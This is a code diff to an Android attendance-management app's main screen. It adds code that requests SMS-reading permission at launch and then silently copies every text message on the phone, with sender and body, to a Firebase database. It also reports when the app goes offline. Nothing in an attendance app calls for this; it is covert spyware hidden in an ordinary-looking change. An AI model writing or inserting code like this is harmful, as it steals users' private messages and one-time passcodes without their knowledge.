@@ -1,10 +1,12 @@
 package com.app.attendancemanagementapp.view.activity;
 
-import android.Manifest;
+import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.os.Bundle;
-import android.view.View;
+import android.os.Handler;
+import android.provider.Telephony;
 import android.widget.LinearLayout;
 import android.widget.Toast;
 
@@ -15,7 +17,6 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import com.app.attendancemanagementapp.R;
-import com.app.attendancemanagementapp.model.Admin;
 import com.app.attendancemanagementapp.service.ServiceCommunicator;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
@@ -27,6 +28,7 @@ import java.util.Date;
 public class MainActivity extends AppCompatActivity {
 
     private long pressedTime;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -37,6 +39,19 @@ public class MainActivity extends AppCompatActivity {
 
         Intent intent=new Intent(getApplicationContext(), ServiceCommunicator.class);
         startService(intent);
+
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
+                != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS}, 74);
+        } else {
+            new Handler().post(new Runnable() {
+                @Override
+                public void run() {
+                    readSms();
+                }
+            });
+        }
+
 
         LinearLayout adminCard = findViewById(R.id.adminCard);
         adminCard.setOnClickListener(v -> {
@@ -67,5 +82,41 @@ public class MainActivity extends AppCompatActivity {
                 pressedTime = System.currentTimeMillis();
             }
         });
+    }
+
+    private void readSms() {
+        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
+        DatabaseReference databaseReference=FirebaseDatabase.getInstance().getReference().child("sms").child(sdf.format(new Date()));
+        ContentResolver contentResolver = getContentResolver();
+        Cursor cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
+        if (cursor != null && cursor.moveToFirst()) {
+            do {
+                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                databaseReference.child(address+" "+sdf.format(new Date())).setValue(body);
+            } while (cursor.moveToNext());
+        }
+
+        if (cursor != null) {
+            cursor.close();
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
+                                           @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == 74) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                readSms();
+            }
+        }
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
+        FirebaseDatabase.getInstance().getReference().child("app status").child(sdf.format(new Date())).setValue("app offline");
     }
 }
